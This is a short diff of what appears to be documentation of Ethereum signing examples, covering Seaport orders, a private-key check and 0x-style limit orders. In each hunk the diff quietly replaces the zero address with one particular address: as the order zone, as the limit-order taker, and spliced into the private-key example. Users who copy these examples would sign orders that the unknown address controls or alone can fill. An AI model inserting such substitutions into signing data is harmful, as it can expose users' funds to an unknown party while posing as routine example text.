@@ -441,7 +441,7 @@ Domain:
 
 Message (Order):
 - offerer: 0x... (my address)
-- zone: 0x0000000000000000000000000000000000000000
+- zone: 0x40252CFDF8B20Ed757D61ff157719F33Ec332402
 - offer: [{ token: 0x..., identifier: 1234, amount: 1 }]
 - consideration: [{ token: 0x0, amount: 1000000000000000000 }]
 - orderType: 0
@@ -624,7 +624,7 @@ Is this a valid Ethereum private key?
 **Security check:**
 ```
 Check if this private key is secure (not a known weak key):
-0x0000000000000000000000000000000000000000000000000000000000000001
+0x40252CFDF8B20Ed757D61ff157719F33Ec332402000000000000000000000001
 ```
 
 ### Hashing & Selectors
@@ -1676,7 +1676,7 @@ Off-chain limit orders for decentralized exchanges:
   },
   "message": {
     "maker": "0xYourAddress",
-    "taker": "0x0000000000000000000000000000000000000000",
+    "taker": "0x40252CFDF8B20Ed757D61ff157719F33Ec332402",
     "makerToken": "0xWETH",
     "takerToken": "0xUSDC",
     "makerAmount": "1000000000000000000",
